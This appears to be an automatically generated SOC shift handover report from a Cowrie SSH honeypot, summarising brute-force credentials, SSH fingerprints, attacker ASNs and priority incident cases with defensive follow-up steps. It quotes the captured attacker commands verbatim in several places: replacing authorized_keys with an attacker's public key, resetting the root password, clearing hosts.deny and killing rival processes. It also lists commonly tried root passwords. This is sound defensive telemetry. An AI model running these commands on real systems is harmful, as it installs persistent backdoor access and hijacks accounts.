# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T13:44:39Z |
| **Shift Time** | 13:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **179** |
| Confirmed Threats | **175** |
| False Positives Filtered | **4** (2.2%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **6** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **115** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **131** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **27** |
| Unique Passwords | **56** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `345gs5662d34` | 31 |
| `admin` | 4 |
| `test` | 3 |
| `postgres` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 31 |
| `3245gs5662d34` | 30 |
| `nPSpP4PBW0` | 4 |
| `Admin1234567$` | 2 |
| `Aa112211.` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 31 |
| `root` | `3245gs5662d34` | 30 |
| `root` | `nPSpP4PBW0` | 4 |
| `root` | `Admin1234567$` | 2 |
| `root` | `Aa112211.` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123!@#asdASD` | `14.103.115.25` | 2026-04-24T11:22:37 |
| `root` | `3245gs5662d34` | `14.103.115.25` | 2026-04-24T11:22:43 |
| `root` | `Admin1234567$` | `87.106.35.227` | 2026-04-24T11:29:54 |
| `root` | `3245gs5662d34` | `87.106.35.227` | 2026-04-24T11:29:59 |
| `root` | `Admin1234567$` | `106.13.122.214` | 2026-04-24T11:38:50 |
| `root` | `vicidial` | `106.13.122.214` | 2026-04-24T11:44:12 |
| `root` | `nPSpP4PBW0` | `27.128.171.39` | 2026-04-24T11:49:24 |
| `root` | `123Qwe!@#` | `43.128.87.215` | 2026-04-24T12:19:19 |
| `root` | `3245gs5662d34` | `43.128.87.215` | 2026-04-24T12:19:22 |
| `root` | `Cloud-12345` | `43.128.87.215` | 2026-04-24T12:22:22 |
| `root` | `nPSpP4PBW0` | `43.128.87.215` | 2026-04-24T12:25:17 |
| `root` | `zxcv..` | `43.128.87.215` | 2026-04-24T12:27:11 |
| `root` | `qaz147258` | `43.128.87.215` | 2026-04-24T12:32:09 |
| `root` | `123.com.` | `43.128.87.215` | 2026-04-24T12:34:08 |
| `root` | `ZAQ!2wsx2019!@` | `43.128.87.215` | 2026-04-24T12:36:13 |
| `root` | `Aa112211.` | `43.128.87.215` | 2026-04-24T12:37:12 |
| `root` | `Admin12!@#` | `43.128.87.215` | 2026-04-24T12:38:09 |
| `root` | `Aa112211.` | `103.149.27.208` | 2026-04-24T13:28:27 |
| `root` | `3245gs5662d34` | `103.149.27.208` | 2026-04-24T13:28:30 |
| `root` | `QWER123@` | `165.154.6.177` | 2026-04-24T13:30:57 |
| `root` | `3245gs5662d34` | `165.154.6.177` | 2026-04-24T13:31:00 |
| `root` | `Root6666@123` | `103.149.27.208` | 2026-04-24T13:31:30 |
| `root` | `cde3CDE#vfr4` | `165.154.6.177` | 2026-04-24T13:31:56 |
| `root` | `zxc123..` | `103.149.27.208` | 2026-04-24T13:32:30 |
| `root` | `root1234!!` | `165.154.6.177` | 2026-04-24T13:32:59 |
| `root` | `a123456a` | `165.154.6.177` | 2026-04-24T13:33:59 |
| `root` | `QWERTYUIOP` | `103.149.27.208` | 2026-04-24T13:34:25 |
| `root` | `root112233@#` | `103.149.27.208` | 2026-04-24T13:35:22 |
| `root` | `nPSpP4PBW0` | `165.154.6.177` | 2026-04-24T13:35:53 |
| `root` | `cde3CDE#vfr4` | `103.149.27.208` | 2026-04-24T13:36:19 |
| `root` | `root112233@#` | `165.154.6.177` | 2026-04-24T13:38:40 |
| `root` | `nPSpP4PBW0` | `103.149.27.208` | 2026-04-24T13:39:06 |
| `root` | `a123456a` | `103.149.27.208` | 2026-04-24T13:40:18 |
| `root` | `123456789@Abc` | `165.154.6.177` | 2026-04-24T13:40:34 |
| `root` | `Root6666@123` | `165.154.6.177` | 2026-04-24T13:41:28 |
| `root` | `DDdd000` | `165.154.6.177` | 2026-04-24T13:42:24 |
| `root` | `DDdd000` | `103.149.27.208` | 2026-04-24T13:42:36 |
| `root` | `newpassword123` | `165.154.6.177` | 2026-04-24T13:43:19 |
| `root` | `root1234!!` | `103.149.27.208` | 2026-04-24T13:43:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **179** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 152 |
| Go SSH scanner | 17 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 120 | 5 |
| `03a80b21afa8...` | Modern SSH client | 32 | 6 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 120 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 32 | 6 | Modern SSH client |
| `95420f9d932d...` | Go SSH scanner | 16 | 5 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xgweg8u3225x"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `27.128.171.39`, `106.13.122.214`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:kbtlYVj11V7j"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.13.122.214`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.6.177`, `103.149.27.208`, `87.106.35.227`, `43.128.87.215`, `14.103.115.25`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **12** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | MEDIUM |
| `AS8560` | IONOS SE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0f2eea3e252d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]25` |
| **First Seen** | 2026-04-24 11:22 |
| **Last Seen** | 2026-04-24 11:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:22:36` | `cowrie.session.connect` |
| `2026-04-24 11:22:36` | `cowrie.client.version` |
| `2026-04-24 11:22:36` | `cowrie.client.kex` |
| `2026-04-24 11:22:37` | `cowrie.login.success` |
| `2026-04-24 11:22:37` | `cowrie.session.params` |
| `2026-04-24 11:22:37` | `cowrie.command.input` |
| `2026-04-24 11:22:37` | `cowrie.command.failed` |
| `2026-04-24 11:22:37` | `cowrie.log.closed` |
| `2026-04-24 11:22:38` | `cowrie.session.params` |
| `2026-04-24 11:22:38` | `cowrie.command.input` |
| `2026-04-24 11:22:38` | `cowrie.session.file_download` |
| `2026-04-24 11:22:38` | `cowrie.log.closed` |
| `2026-04-24 11:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]25` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050c806561d4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]25` |
| **First Seen** | 2026-04-24 11:22 |
| **Last Seen** | 2026-04-24 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:22:42` | `cowrie.session.connect` |
| `2026-04-24 11:22:42` | `cowrie.client.version` |
| `2026-04-24 11:22:42` | `cowrie.client.kex` |
| `2026-04-24 11:22:43` | `cowrie.login.success` |
| `2026-04-24 11:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]25` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7ea6fae3d3

| Field | Detail |
|---|---|
| **Source IP** | `87.106.35[.]227` |
| **First Seen** | 2026-04-24 11:29 |
| **Last Seen** | 2026-04-24 11:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:29:53` | `cowrie.session.connect` |
| `2026-04-24 11:29:53` | `cowrie.client.version` |
| `2026-04-24 11:29:53` | `cowrie.client.kex` |
| `2026-04-24 11:29:54` | `cowrie.login.success` |
| `2026-04-24 11:29:54` | `cowrie.session.params` |
| `2026-04-24 11:29:54` | `cowrie.command.input` |
| `2026-04-24 11:29:54` | `cowrie.command.failed` |
| `2026-04-24 11:29:55` | `cowrie.log.closed` |
| `2026-04-24 11:29:55` | `cowrie.session.params` |
| `2026-04-24 11:29:55` | `cowrie.command.input` |
| `2026-04-24 11:29:55` | `cowrie.session.file_download` |
| `2026-04-24 11:29:55` | `cowrie.log.closed` |
| `2026-04-24 11:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.35[.]227` to AbuseIPDB if not already reported
- [ ] Block `87.106.35[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feaee87c3f8a

| Field | Detail |
|---|---|
| **Source IP** | `87.106.35[.]227` |
| **First Seen** | 2026-04-24 11:29 |
| **Last Seen** | 2026-04-24 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:29:58` | `cowrie.session.connect` |
| `2026-04-24 11:29:58` | `cowrie.client.version` |
| `2026-04-24 11:29:58` | `cowrie.client.kex` |
| `2026-04-24 11:29:59` | `cowrie.login.success` |
| `2026-04-24 11:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.35[.]227` to AbuseIPDB if not already reported
- [ ] Block `87.106.35[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef8a57f358ea

| Field | Detail |
|---|---|
| **Source IP** | `106.13.122[.]214` |
| **First Seen** | 2026-04-24 11:38 |
| **Last Seen** | 2026-04-24 11:39 |
| **Session Duration** | 59s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xgweg8u3225x"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:38:48` | `cowrie.session.connect` |
| `2026-04-24 11:38:48` | `cowrie.client.version` |
| `2026-04-24 11:38:48` | `cowrie.client.kex` |
| `2026-04-24 11:38:50` | `cowrie.login.success` |
| `2026-04-24 11:38:54` | `cowrie.session.params` |
| `2026-04-24 11:38:54` | `cowrie.command.input` |
| `2026-04-24 11:38:54` | `cowrie.command.failed` |
| `2026-04-24 11:38:58` | `cowrie.log.closed` |
| `2026-04-24 11:38:59` | `cowrie.session.params` |
| `2026-04-24 11:38:59` | `cowrie.command.input` |
| `2026-04-24 11:39:03` | `cowrie.session.file_download` |
| `2026-04-24 11:39:03` | `cowrie.log.closed` |
| `2026-04-24 11:39:16` | `cowrie.session.params` |
| `2026-04-24 11:39:16` | `cowrie.command.input` |
| `2026-04-24 11:39:16` | `cowrie.log.closed` |
| `2026-04-24 11:39:17` | `cowrie.session.params` |
| `2026-04-24 11:39:17` | `cowrie.command.input` |
| `2026-04-24 11:39:17` | `cowrie.log.closed` |
| `2026-04-24 11:39:18` | `cowrie.session.params` |
| `2026-04-24 11:39:18` | `cowrie.command.input` |
| `2026-04-24 11:39:20` | `cowrie.session.file_download` |
| `2026-04-24 11:39:20` | `cowrie.log.closed` |
| `2026-04-24 11:39:21` | `cowrie.session.params` |
| `2026-04-24 11:39:21` | `cowrie.command.input` |
| `2026-04-24 11:39:21` | `cowrie.log.closed` |
| `2026-04-24 11:39:23` | `cowrie.session.params` |
| `2026-04-24 11:39:23` | `cowrie.command.input` |
| `2026-04-24 11:39:23` | `cowrie.log.closed` |
| `2026-04-24 11:39:24` | `cowrie.session.params` |
| `2026-04-24 11:39:24` | `cowrie.command.input` |
| `2026-04-24 11:39:24` | `cowrie.command.input` |
| `2026-04-24 11:39:25` | `cowrie.log.closed` |
| `2026-04-24 11:39:25` | `cowrie.session.params` |
| `2026-04-24 11:39:25` | `cowrie.command.input` |
| `2026-04-24 11:39:26` | `cowrie.log.closed` |
| `2026-04-24 11:39:27` | `cowrie.session.params` |
| `2026-04-24 11:39:27` | `cowrie.command.input` |
| `2026-04-24 11:39:28` | `cowrie.log.closed` |
| `2026-04-24 11:39:28` | `cowrie.session.params` |
| `2026-04-24 11:39:28` | `cowrie.command.input` |
| `2026-04-24 11:39:29` | `cowrie.log.closed` |
| `2026-04-24 11:39:30` | `cowrie.session.params` |
| `2026-04-24 11:39:30` | `cowrie.command.input` |
| `2026-04-24 11:39:30` | `cowrie.log.closed` |
| `2026-04-24 11:39:32` | `cowrie.session.params` |
| `2026-04-24 11:39:32` | `cowrie.command.input` |
| `2026-04-24 11:39:32` | `cowrie.log.closed` |
| `2026-04-24 11:39:33` | `cowrie.session.params` |
| `2026-04-24 11:39:33` | `cowrie.command.input` |
| `2026-04-24 11:39:33` | `cowrie.log.closed` |
| `2026-04-24 11:39:38` | `cowrie.session.params` |
| `2026-04-24 11:39:38` | `cowrie.command.input` |
| `2026-04-24 11:39:39` | `cowrie.log.closed` |
| `2026-04-24 11:39:41` | `cowrie.session.params` |
| `2026-04-24 11:39:41` | `cowrie.command.input` |
| `2026-04-24 11:39:42` | `cowrie.log.closed` |
| `2026-04-24 11:39:43` | `cowrie.session.params` |
| `2026-04-24 11:39:43` | `cowrie.command.input` |
| `2026-04-24 11:39:44` | `cowrie.log.closed` |
| `2026-04-24 11:39:46` | `cowrie.session.params` |
| `2026-04-24 11:39:46` | `cowrie.command.input` |
| `2026-04-24 11:39:47` | `cowrie.log.closed` |
| `2026-04-24 11:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.122[.]214` to AbuseIPDB if not already reported
- [ ] Block `106.13.122[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faec5ee60515

| Field | Detail |
|---|---|
| **Source IP** | `106.13.122[.]214` |
| **First Seen** | 2026-04-24 11:44 |
| **Last Seen** | 2026-04-24 11:45 |
| **Session Duration** | 99s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kbtlYVj11V7j"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 11:44:09` | `cowrie.session.connect` |
| `2026-04-24 11:44:09` | `cowrie.client.version` |
| `2026-04-24 11:44:10` | `cowrie.client.kex` |
| `2026-04-24 11:44:12` | `cowrie.login.success` |
| `2026-04-24 11:44:13` | `cowrie.session.params` |
| `2026-04-24 11:44:13` | `cowrie.command.input` |
| `2026-04-24 11:44:13` | `cowrie.command.failed` |
| `2026-04-24 11:44:13` | `cowrie.log.closed` |
| `2026-04-24 11:44:13` | `cowrie.session.params` |
| `2026-04-24 11:44:13` | `cowrie.command.input` |
| `2026-04-24 11:44:13` | `cowrie.session.file_download` |
| `2026-04-24 11:44:13` | `cowrie.log.closed` |
| `2026-04-24 11:44:26` | `cowrie.session.params` |
| `2026-04-24 11:44:26` | `cowrie.command.input` |
| `2026-04-24 11:44:27` | `cowrie.log.closed` |
| `2026-04-24 11:44:28` | `cowrie.session.params` |
| `2026-04-24 11:44:28` | `cowrie.command.input` |
| `2026-04-24 11:44:28` | `cowrie.log.closed` |
| `2026-04-24 11:44:29` | `cowrie.session.params` |
| `2026-04-24 11:44:29` | `cowrie.command.input` |
| `2026-04-24 11:44:29` | `cowrie.session.file_download` |
| `2026-04-24 11:44:29` | `cowrie.log.closed` |
| `2026-04-24 11:44:30` | `cowrie.session.params` |
| `2026-04-24 11:44:30` | `cowrie.command.input` |
| `2026-04-24 11:44:36` | `cowrie.log.closed` |
| `2026-04-24 11:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.122[.]214` to AbuseIPDB if not already reported
- [ ] Block `106.13.122[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a6737293631

| Field | Detail |
|---|---|
| **Source IP** | `27.128.171[.]39` |
| **First Seen** | 2026-04-24 11:49 |
| **Last Seen** | 2026-04-24 11:49 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GqIwTgJ9IA8K"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
